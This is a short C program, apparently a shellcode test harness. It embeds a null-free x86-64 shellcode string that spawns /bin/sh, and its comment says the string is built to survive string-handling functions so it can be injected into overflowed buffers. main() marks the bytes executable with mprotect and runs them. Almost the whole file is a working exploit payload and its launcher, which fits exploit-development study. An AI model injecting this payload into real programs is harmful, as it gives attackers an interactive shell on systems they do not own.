#include <stdint.h>
#include <sys/mman.h>

/** Binary for what nasm -f elf64 shellcode_nz.nasm spits
 * Notice the lack of \x00. This can be placed in buffer used by
 * string handling functions and it should work ok.
 */
char code[] = "\xeb\x27\x5e\x48\xc7\xc0\xff\xff\xff\xff\x48\x83\xe8\xc4\x48\x89\xf7\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x31\xff\x48\xc7\xc0\xff\xff\xff\xff\x48\x83\xe8\xc3\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00";

int main() {
  // mprotect is needed to make the zone in which code resides executable
  mprotect((void *)((uint64_t)code & ~4095), 4096, PROT_READ | PROT_EXEC);
  (*(void (*)())code)();
  return 0;
}
